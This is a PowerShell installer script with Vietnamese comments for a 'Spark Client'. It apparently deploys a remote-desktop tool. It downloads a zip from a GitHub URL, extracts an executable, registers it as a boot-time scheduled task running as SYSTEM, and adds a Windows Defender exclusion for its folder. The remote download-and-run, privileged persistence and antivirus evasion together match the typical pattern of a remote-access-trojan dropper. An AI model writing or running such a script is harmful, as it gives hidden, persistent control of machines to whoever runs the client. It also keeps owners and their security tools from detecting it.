# install-spark-client.ps1
# Auto install Spark Client on Windows
# 1. Download client.zip from GitHub
# 2. Extract client.exe to C:\Program Files\Spark
# 3. Register scheduled task for auto-start
# 4. Add Windows Defender exclusion

$RepoUrl = "https://raw.githubusercontent.com/tutamdev/remote-desktop/main"  # chỉnh lại nếu đổi repo
$ZipUrl = "$RepoUrl/client.zip"
$TempZip = "$env:TEMP\client.zip"

$DestDir = "C:\Program Files\Spark"
$DestExe = Join-Path $DestDir "client.exe"
$TaskName = "SparkClient"

Write-Host ">>> Installing Spark Client..."

# 1. Create destination folder
if (!(Test-Path -Path $DestDir)) {
    Write-Host ">>> Creating folder: $DestDir"
    New-Item -Path $DestDir -ItemType Directory -Force | Out-Null
}

# 2. Download client.zip
Write-Host ">>> Downloading client.zip from $ZipUrl"
Invoke-WebRequest -Uri $ZipUrl -OutFile $TempZip -UseBasicParsing

# 3. Extract zip
Write-Host ">>> Extracting client.exe to $DestDir"
Expand-Archive -Path $TempZip -DestinationPath $DestDir -Force

# 4. Remove old scheduled task if exists
if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
    Write-Host ">>> Removing old scheduled task: $TaskName"
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
}

# 5. Create new scheduled task (auto run at startup)
Write-Host ">>> Registering scheduled task: $TaskName"
$Action = New-ScheduledTaskAction -Execute $DestExe
$Trigger = New-ScheduledTaskTrigger -AtStartup
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal

# 6. Add Defender exclusion
Write-Host ">>> Adding Windows Defender exclusion: $DestDir"
try {
    Add-MpPreference -ExclusionPath $DestDir
    Write-Host ">>> Defender exclusion added successfully."
} catch {
    Write-Warning ">>> Failed to add exclusion (please run PowerShell as Administrator)."
}

Write-Host ">>> Done. Spark Client will auto-start at Windows boot."
